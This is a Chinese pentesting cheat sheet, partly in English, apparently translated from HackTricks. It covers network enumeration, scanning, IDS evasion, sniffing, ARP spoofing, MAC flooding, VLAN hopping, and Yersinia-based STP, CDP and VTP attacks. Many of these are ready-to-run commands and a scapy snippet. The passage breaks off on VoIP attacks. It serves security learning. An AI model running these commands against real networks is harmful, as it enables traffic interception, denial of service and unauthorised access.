# 枚举
~~*对于国内环境，枚举的前期会使用[[PreRecon]]*~~
## 从外部枚举主机
这将是一个简短的部分，介绍如何查找从 Internet 响应的 IP。 在这种情况下，有一些 IP 范围（甚至可能是几个范围），只是为了找到哪些 IP 正在响应。
### ICMP
```sh
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### 枚举TCP端口
发现所有类型的ICMP数据包都被过滤是很常见的。然后，要检查主机是否已启动，所能做的就是尝试查找打开的端口。每个主机有 65535 个端口，因此，如果有一个“大”范围，则无法测试每个主机的每个端口是否打开，这将花费太多时间。需要使用快速端口扫描仪（ masscan ）和更多使用的端口列表：
```sh
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
也可以使用 `nmap` 执行此步骤，但它速度较慢，并且 `nmap` 无法识别有些主机。
### 枚举HTTP端口
专门扫HTTP服务时：
```sh
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### 枚举UDP端口
还可以尝试检查某些 UDP 端口是否打开，以决定是否应该更加关注某个主机。 由于 UDP 服务通常不会对常规空 UDP 探测数据包做出任何数据响应，因此很难判断端口是否被过滤或打开。决定这一点的最简单方法是发送与正在运行的服务相关的数据包，由于不知道哪个服务正在运行，因此根据端口号尝试最有可能的：
```sh
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
nmap 将测试 /24 范围内每个主机中的前 1000 个 UDP 端口，但即使仅此也需要 >20 分钟。如果需要最快的结果，可以使用 udp-proto-scanner ： `./udp-proto-scanner.pl 199.66.11.53/24` 这会将这些 UDP 探测器发送到其预期端口（对于 /24 范围，这只需要 1 分钟）：
```UDP服务探针
DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp。
```
### 用SCTP发现端口
```sh
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## 从内部枚举主机
### 被动枚举
可以使用以下工具被动地发现已连接网络中的主机：
```sh
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动枚举
注意，[[#从外部枚举主机]]中的任何手段也可以在此应用，但是因为与目的主机处于同一网络，可以执行更多的操作。
```sh
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
#### 主动ICMP
- 如果 ping 子网广播地址，则 ping 应到达每个主机，它们可以响应： `ping -b 10.10.5.255`
- 通过ping网络广播地址，甚至可以在其他子网中找到主机： `ping -b 255.255.255.255`
- 使用 `nmap` 的 `-PE` 、 `-PP` 、 `-PM` 标志分别执行主机发现发送 ICMPv4 回显、时间戳和子网掩码请求：`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`
#### Wake On Lan
局域网唤醒用于通过网络消息打开计算机。用于打开计算机的魔术数据包只是一个提供 MAC Dst 的数据包，然后在同一 paket 中重复 16 次。 然后，这种数据包通常以以太网0x0842或UDP数据包的形式发送到端口9。 如果未提供 \[MAC]，则数据包将发送到广播以太网（广播 MAC 将是重复的 MAC）。
```
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机
一旦枚举了要深入扫描的所有IP（外部或内部），就可以执行不同的操作。
### TCP扫描
- **Open** port: _SYN --> SYN/ACK --> RST_  
    开放端口：SYN --> SYN/ACK --> RST
- **Closed** port: _SYN --> RST/ACK_  
    关闭端口：SYN --> RST/ACK
- **Filtered** port: _SYN --> \[NO RESPONSE]_  
    过滤端口：SYN --> \[无响应]
- **Filtered** port: _SYN --> ICMP message_  
    过滤端口：SYN --> ICMP 消息
```
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP扫描
扫描 UDP 端口有 2 个选项：
- 发送 UDP 数据包并检查响应 ICMP 是否无法访问（在一些情况下，ICMP 将被过滤，因此在端口关闭或打开的情况下，不会收到任何信息）。
- 发送格式化的数据报以从服务（例如，DNS、DHCP、TFTP 等，如 nmap-payloads 中列出）引发响应。如果收到响应，则端口处于打开状态。
**Nmap 将使用“-sV”混合这两个选项（UDP 扫描非常慢），但请注意 UDP 扫描比 TCP 扫描要慢：
```
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP扫描
SCTP（流控制传输协议）旨在与 TCP（传输控制协议）和 UDP（用户数据报协议）一起使用。其主要目的是促进通过 IP 网络传输电话数据，反映了信令系统 7 （SS7） 中的许多可靠性特性。 SCTP 是 SIGTRAN 协议系列的核心组件，旨在通过 IP 网络传输 SS7 信号。

对 SCTP 的支持由各种操作系统提供，例如 IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS 和 VxWorks，表明其在电信和网络领域的广泛接受和实用性。

nmap 提供两种不同的 SCTP 扫描：-sY 和 -sZ
```
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 规避
#### **操纵TTL**

发送一些具有足够 TTL 的数据包以到达 IDS/IPS，但不足以到达最终系统。然后，发送另一个具有与其他数据包相同序列的数据包，以便 IPS/IDS 会认为它们是重复的并且不会检查它们，但实际上它们携带了恶意内容。

**Nmap 选项： `--ttlvalue <value>`

#### 避免签名

Just add garbage data to the packets so the IPS/IDS signature is avoided.  
只需将垃圾数据添加到数据包中，即可避免 IPS/IDS 签名。

**Nmap option:** `--data-length 25` Nmap 选项： `--data-length 25`

#### 分段数据包

只需对数据包进行分段并发送即可。如果 IDS/IPS 无法重新组装它们，它们将到达最终主机。

**Nmap option:** `-f` Nmap 选项： `-f`

#### **Invalid** _**checksum**_ 校验和无效

出于性能原因，传感器(ID/PS)通常不计算校验和。因此，攻击者可以发送一个数据包，该数据包将由传感器解释，但被最终主机拒绝。 例：

发送带有 RST 标志和无效校验和的数据包，因此，IPS/IDS 可能会认为此数据包将关闭连接，但最终主机将丢弃该数据包，因为校验和无效。

#### **不常见的 IP 和 TCP 选项**

传感器可能会忽略在 IP 和 TCP 标头中设置了某些标志和选项的数据包，而目标主机在收到数据包时接受数据包。

####  **重叠数据包**

对数据包进行分段时，数据包之间可能存在某种重叠（数据包 2 的前 8 个字节可能与数据包 1 的最后 8 个字节重叠，数据包 2 的最后 8 个字节与数据包 3 的前 8 个字节重叠）。然后，如果 IDS/IPS 以与最终主机不同的方式重新组合它们，则将解释不同的数据包。 或者，可能会有 2 个具有相同偏移量的数据包，主机必须决定采用哪一个。

- **BSD**：它优先选择偏移量较小的数据包。对于具有相同偏移量的数据包，它将选择第一个数据包。
- **Linux**：与 BSD 类似，但它更喜欢具有相同偏移量的最后一个数据包。
- **第一个** （Windows）：第一个出现的值留下。
- **最后一个** （cisco）：最后一个值留下。
### Nmap
见[[NMAP]].
### 揭露内部 IP 地址

配置错误的路由器、防火墙和网络设备有时会使用非公网IP响应网络探测。 tcpdump 可用于识别测试期间从专用地址接收的数据包。具体来说，在 Kali Linux 上，数据包可以在 eth2 接口上捕获，该接口可从公共 Internet 访问。请务必注意，如果您的设置位于 NAT 或防火墙后面，则此类数据包可能会被过滤掉。
```
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## 嗅探
嗅探 您可以通过查看捕获的帧和数据包来了解 IP 范围、子网大小、MAC 地址和主机名的详细信息。如果网络配置错误或在压力下切换结构，攻击者可以通过被动网络嗅探捕获敏感材料。

如果交换机配置正确，您将只能看到发往 MAC 地址的广播帧和材料。
### TCPDump
```
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
还可以通过 SSH 会话从远程机器捕获数据包，并使用 Wireshark 作为 GUI 实时捕获数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark 
无需多言.[[WireShark]]
### 捕获凭据
可以使用 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 等工具来解析来自 pcap 或实时接口的凭据。
## LAN attacks 局域网攻击

### ARP 欺骗
ARP 欺骗包括发送无偿的 ARPResponses 以指示机器的 IP 具有我们设备的 MAC。然后，受害者将更改 ARP 表，并在每次想要联系被欺骗的 IP 时联系我们的机器。
#### **Bettercap**
```
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **Arpspoof**
```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC 泛洪 - CAM 溢出

溢出交换机的 CAM 表，发送大量具有不同源 mac 地址的数据包。当 CAM 表已满时，交换机开始像集线器一样运行（广播所有流量）。
```
macof -i <interface>
```
在现代交换机中，此漏洞已修复。

### 802.1Q VLAN / DTP 攻击

#### Dynamic Trunking 动态中继
动态中继协议 （DTP） 设计为链路层协议，以促进自动中继系统，允许交换机自动选择中继模式（中继）或非中继模式的端口。DTP 的部署通常被视为网络设计欠佳的迹象，这凸显了仅在必要时手动配置中继并确保正确文档的重要性。

默认情况下，交换机端口设置为在动态自动模式下运行，这意味着如果相邻交换机提示，它们已准备好启动中继。当渗透测试者或攻击者连接到交换机并发送 DTP 理想帧，迫使端口进入中继模式时，就会出现安全问题。此操作使攻击者能够通过 STP 帧分析枚举 VLAN，并通过设置虚拟接口来规避 VLAN 分段。
默认情况下，攻击者可以利用许多交换机中存在 DTP 来模拟交换机的行为，从而访问所有 VLAN 上的流量。脚本 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 用于监控接口，显示交换机是处于默认模式、中继模式、动态模式、自动模式还是访问模式，后者是唯一不受 VLAN 跳跃攻击影响的配置。此工具评估交换机的漏洞状态。

如果发现网络漏洞，可以使用 Yersinia 工具通过 DTP 协议“启用中继”，从而可以观察来自所有 VLAN 的数据包。
```
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FHFo4KympSBlYmczt3NGa%252Fimage.png%3Falt=media%26token=49ed09d2-b172-4f51-93ed-e2ddec01a085&width=768&dpr=4&quality=100&sign=4e56216fe93a121bb97e57d11d712785c1ad2914af57c1509393e04b17fbb551)

要枚举 VLAN，还可以使用脚本 DTPHijacking.py 生成 DTP Desirable 帧。在任何情况下都不要中断脚本。它每三秒注入一次 DTP Desirable。 交换机上动态创建的中继信道仅存活 5 分钟。五分钟后，树干脱落。
```
sudo python3 DTPHijacking.py --interface eth0
```

I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5**) indicates the **802.1Q** encapsulation type.  
我想指出的是，Access/Desirable （0x03） 表示 DTP 帧属于 Desirable 类型，它告诉端口切换到 Trunk 模式。802.1Q/802.1Q （0xa5） 表示 802.1Q 封装类型。

By analyzing the STP frames, **we learn about the existence of VLAN 30 and VLAN 60.**  
通过分析 STP 帧，我们了解了 VLAN 30 和 VLAN 60 的存在。

![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FMUXprxKCyCa7thNk18za%252Fimage.png%3Falt=media%26token=821ee5be-decd-4c2b-97e8-2bbf93d1a88d&width=768&dpr=4&quality=100&sign=f32d30015b5d8eb5e317a3e4d4297c705ff5034c926ff02f366c112a8eb1e662)

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#attacking-specific-vlans)

Attacking specific VLANs 攻击特定 VLAN

Once you known VLAN IDs and IPs values, you can **configure a virtual interface to attack a specific VLAN**. If DHCP is not available, then use _ifconfig_ to set a static IP address.  
知道 VLAN ID 和 IP 值后，您可以配置虚拟接口来攻击特定 VLAN。 如果 DHCP 不可用，则使用 ifconfig 设置静态 IP 地址。

Copy 复制

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

Copy 复制

```
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

Copy 复制

```
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#automatic-vlan-hopper)

Automatic VLAN Hopper 自动 VLAN 漏斗

The discussed attack of **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** other VLANs are **automatically performed** by the tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)  
所讨论的动态中继攻击和创建虚拟接口以发现其他 VLAN 内的主机由以下工具自动执行： [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#double-tagging)

Double Tagging 双重标记

If an attacker knows the value of the **MAC, IP and VLAN ID of the victim host**, he could try to **double tag a frame** with its designated VLAN and the VLAN of the victim and send a packet. As the **victim won't be able to connect back** with the attacker, so the **best option for the attacker is communicate via UDP** to protocols that can perform some interesting actions (like SNMP).  
如果攻击者知道受害主机的MAC、IP和VLAN ID的值，他可以尝试使用其指定的VLAN和受害主机的VLAN对帧进行双重标记，并发送数据包。由于受害者无法与攻击者重新连接，因此攻击者的最佳选择是通过 UDP 与可以执行一些有趣操作（如 SNMP）的协议进行通信。

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.  
攻击者的另一种选择是启动TCP端口扫描，欺骗由攻击者控制并由受害者访问的IP（可能通过互联网）。然后，如果攻击者从受害者那里收到一些数据包，攻击者可以嗅探他拥有的第二台主机。

![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FHHYuR9d580W7O081ip6n%252Fimage.png%3Falt=media%26token=b293aa52-b32c-407c-a5fb-a6cde8cca7ad&width=768&dpr=4&quality=100&sign=a560fb3c83b695c1bd6ec08fce46a9e073f4cd8d957084b7af2dacb30a7f889d)

To perform this attack you could use scapy: `pip install scapy`  
要执行此攻击，您可以使用 scapy： `pip install scapy`

Copy 复制

```
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#d679)

Lateral VLAN Segmentation Bypass 横向 VLAN 分段旁路

If you have **access to a switch that you are directly connected to**, you have the ability to **bypass VLAN segmentation** within the network. Simply **switch the port to trunk mode** (otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.  
如果您有权访问直接连接到的交换机，则可以绕过网络内的 VLAN 分段。只需将端口切换到中继模式（也称为中继），使用目标 VLAN 的 ID 创建虚拟接口，然后配置 IP 地址即可。您可以尝试动态请求地址 （DHCP），也可以静态配置它。这取决于具体情况。

[PAGE 页Lateral VLAN Segmentation Bypass 横向 VLAN 分段旁路](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/lateral-vlan-segmentation-bypass)

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#layer-3-private-vlan-bypass)

Layer 3 Private VLAN Bypass 第 3 层专用 VLAN 旁路

In certain environments, such as guest wireless networks, **port isolation (also known as private VLAN)** settings are implemented to prevent clients connected to a wireless access point from directly communicating with each other. However, a technique has been identified that can circumvent these isolation measures. This technique exploits either the lack of network ACLs or their improper configuration, enabling IP packets to be routed through a router to reach another client on the same network.  
在某些环境（如访客无线网络）中，实施了端口隔离（也称为专用 VLAN）设置，以防止连接到无线接入点的客户端直接相互通信。但是，已经确定了一种可以规避这些隔离措施的技术。此技术利用缺少网络 ACL 或其配置不当，使 IP 数据包能够通过路由器路由到同一网络上的另一个客户端。

The attack is executed by creating a **packet that carries the IP address of the destination client but with the router's MAC address**. This causes the router to mistakenly forward the packet to the target client. This approach is similar to that used in Double Tagging Attacks, where the ability to control a host accessible to the victim is used to exploit the security flaw.  
攻击是通过创建一个数据包来执行的，该数据包带有目标客户端的 IP 地址，但具有路由器的 MAC 地址。这会导致路由器错误地将数据包转发到目标客户端。此方法类似于双重标记攻击中使用的方法，在双重标记攻击中，控制受害者可访问的主机的能力用于利用安全漏洞。

**Key Steps of the Attack: 攻击的关键步骤：**

1. **Crafting a Packet:** A packet is specially crafted to include the target client's IP address but with the router's MAC address.  
    制作数据包：数据包经过特殊设计，包含目标客户端的 IP 地址，但包含路由器的 MAC 地址。
    
2. **Exploiting Router Behavior:** The crafted packet is sent up to the router, which, due to the configuration, redirects the packet to the target client, bypassing the isolation provided by private VLAN settings.  
    利用路由器行为：构建的数据包被发送到路由器，由于配置的原因，路由器会将数据包重定向到目标客户端，绕过专用 VLAN 设置提供的隔离。
    

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#vtp-attacks)

VTP Attacks VTP 攻击

VTP (VLAN Trunking Protocol) centralizes VLAN management. It utilizes revision numbers to maintain VLAN database integrity; any modification increments this number. Switches adopt configurations with higher revision numbers, updating their own VLAN databases.  
VTP（VLAN 中继协议）集中 VLAN 管理。它利用修订号来维护 VLAN 数据库的完整性;任何修改都会增加此数字。交换机采用具有更高修订号的配置，更新自己的 VLAN 数据库。

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#vtp-domain-roles)

VTP Domain Roles VTP 域角色

- **VTP Server:** Manages VLANs—creates, deletes, modifies. It broadcasts VTP announcements to domain members.  
    VTP 服务器：管理 VLAN — 创建、删除、修改。它向域成员广播 VTP 公告。
    
- **VTP Client:** Receives VTP announcements to synchronize its VLAN database. This role is restricted from local VLAN configuration modifications.  
    VTP 客户端：接收 VTP 通知以同步其 VLAN 数据库。此角色受到本地 VLAN 配置修改的限制。
    
- **VTP Transparent:** Doesn't engage in VTP updates but forwards VTP announcements. Unaffected by VTP attacks, it maintains a constant revision number of zero.  
    VTP 透明：不参与 VTP 更新，但转发 VTP 公告。不受 VTP 攻击的影响，它保持恒定的修订号为零。
    

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#vtp-a-dvertisement-types)

VTP Advertisement Types VTP 通告类型

- **Summary Advertisement:** Broadcasted by the VTP server every 300 seconds, carrying essential domain information.  
    摘要通告：由 VTP 服务器每 300 秒广播一次，携带重要的域信息。
    
- **Subset Advertisement:** Sent following VLAN configuration changes.  
    子集通告：在 VLAN 配置更改后发送。
    
- **Advertisement Request:** Issued by a VTP client to request a Summary Advertisement, typically in response to detecting a higher configuration revision number.  
    播发请求：由 VTP 客户端发出，用于请求摘要播发，通常用于响应检测到更高的配置修订号。
    

VTP vulnerabilities are exploitable exclusively via trunk ports as VTP announcements circulate solely through them. Post-DTP attack scenarios might pivot towards VTP. Tools like Yersinia can facilitate VTP attacks, aiming to wipe out the VLAN database, effectively disrupting the network.  
VTP 漏洞只能通过中继端口利用，因为 VTP 公告仅通过中继端口传播。DTP 后的攻击场景可能会转向 VTP。像耶尔森氏菌这样的工具可以促进 VTP 攻击，旨在清除 VLAN 数据库，从而有效地破坏网络。

Note: This discussion pertains to VTP version 1 (VTPv1).  
注意：此讨论与 VTP 版本 1 （VTPv1） 有关。

Copy 复制

```
%% yersinia -G # Launch Yersinia in graphical mode ```
```

In Yersinia's graphical mode, choose the deleting all VTP vlans option to purge the VLAN database.  
在 Yersinia 的图形模式下，选择删除所有 VTP VLAN 选项以清除 VLAN 数据库。

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#stp-attacks)

STP Attacks STP 攻击

**If you cannot capture BPDU frames on your interfaces, it is unlikely that you will succeed in an STP attack.  
如果无法捕获接口上的 BPDU 帧，则 STP 攻击不太可能成功。**

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#stp-bpdu-dos)

**STP BPDU DoS STP BPDU的DoS**

Sending a lot of BPDUs TCP (Topology Change Notification) or Conf (the BPDUs that are sent when the topology is created) the switches are overloaded and stop working correctly.  
发送大量 BPDU、TCP（拓扑更改通知）或 Conf（创建拓扑时发送的 BPDU），交换机过载并停止正常工作。

Copy 复制

```
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#stp-tcp-attack)

**STP TCP Attack STP TCP 攻击**

When a TCP is sent, the CAM table of the switches will be deleted in 15s. Then, if you are sending continuously this kind of packets, the CAM table will be restarted continuously (or every 15segs) and when it is restarted, the switch behaves as a hub  
发送TCP时，交换机的CAM表将在15秒内删除。然后，如果您连续发送此类数据包，则 CAM 表将连续（或每 15 秒）重新启动一次，当它重新启动时，交换机将充当集线器

Copy 复制

```
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#stp-root-attack)

**STP Root Attack STP 根攻击**

The attacker simulates the behaviour of a switch to become the STP root of the network. Then, more data will pass through him. This is interesting when you are connected to two different switches. This is done by sending BPDUs CONF packets saying that the **priority** value is less than the actual priority of the actual root switch.  
攻击者模拟交换机的行为，成为网络的STP根。然后，更多的数据将通过他。当您连接到两个不同的交换机时，这很有趣。 这是通过发送 BPDU 的 CONF 数据包来完成的，该数据包表示优先级值小于实际根交换机的实际优先级。

Copy 复制

```
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```

**If the attacker is connected to 2 switches he can be the root of the new tree and all the traffic between those switches will pass through him** (a MITM attack will be performed).  
如果攻击者连接到 2 台交换机，他可以成为新树的根，并且这些交换机之间的所有流量都将通过他（将执行 MITM 攻击）。

Copy 复制

```
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#cdp-attacks)

CDP Attacks CDP 攻击

CISCO Discovery Protocol (CDP) is essential for communication between CISCO devices, allowing them to **identify each other and share configuration details**.  
CISCO 发现协议 （CDP） 对于 CISCO 设备之间的通信至关重要，允许它们相互识别并共享配置详细信息。

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#id-0e0f)

Passive Data Collection 被动数据收集

CDP is configured to broadcast information through all ports, which might lead to a security risk. An attacker, upon connecting to a switch port, could deploy network sniffers like **Wireshark**, **tcpdump**, or **Yersinia**. This action can reveal sensitive data about the network device, including its model and the version of Cisco IOS it runs. The attacker might then target specific vulnerabilities in the identified Cisco IOS version.  
CDP配置为通过所有端口广播信息，这可能会导致安全风险。攻击者在连接到交换机端口后，可以部署网络嗅探器，如 Wireshark、tcpdump 或 Yersinia。此操作可以显示有关网络设备的敏感数据，包括其型号和运行的Cisco IOS版本。然后，攻击者可能以已识别的 Cisco IOS 版本中的特定漏洞为目标。

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#id-0d6a)

Inducing CDP Table Flooding 诱导 CDP 表泛滥

A more aggressive approach involves launching a Denial of Service (DoS) attack by overwhelming the switch's memory, pretending to be legitimate CISCO devices. Below is the command sequence for initiating such an attack using Yersinia, a network tool designed for testing:  
一种更激进的方法包括通过压倒交换机的内存来发起拒绝服务（DoS）攻击，假装是合法的CISCO设备。以下是使用 Yersinia（一种专为测试而设计的网络工具）发起此类攻击的命令序列：

Copy 复制

```
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```

During this attack, the switch's CPU and CDP neighbor table are heavily burdened, leading to what is often referred to as **“network paralysis”** due to the excessive resource consumption.  
在这次攻击中，交换机的 CPU 和 CDP 邻居表负担沉重，由于资源消耗过多，导致通常所说的“网络瘫痪”。

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#cdp-impersonation-attack)

CDP Impersonation Attack CDP 冒充攻击

Copy 复制

```
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```

You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.  
你也可以使用 scapy .请务必使用 `scapy/contrib` 包安装它。

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#voip-attacks-and-the-voip-hopper-tool)

VoIP Attacks and the VoIP Hopper Tool  
VoIP 攻击和 VoIP 漏斗工具

VoIP phones, increasingly integrated with IoT devices, offer functionalities like unlocking doors or controlling thermostats through special phone numbers. However, this integration can pose security risks.  
